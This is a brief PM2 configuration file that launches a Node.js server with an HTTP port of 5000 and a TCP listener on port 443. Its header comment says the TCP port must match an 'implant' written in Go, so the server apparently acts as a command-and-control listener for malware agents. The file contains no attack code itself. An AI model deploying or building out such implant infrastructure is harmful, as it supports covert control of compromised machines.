/**
 * PM2: use from repo root — pm2 start ecosystem.config.cjs && pm2 save
 * Implant TCP must be 443 (matches lastfinalversion2.go default). Do not set TCP_PORT to PORT or HTTP port.
 */
module.exports = {
  apps: [
    {
      name: 'fahis-1',
      cwd: __dirname,
      script: 'server.js',
      exec_mode: 'fork',
      instances: 1,
      env: {
        NODE_ENV: 'production',
        PORT: '5000',
        TCP_HOST: '0.0.0.0',
        TCP_PORT: '443',
      },
    },
  ],
};
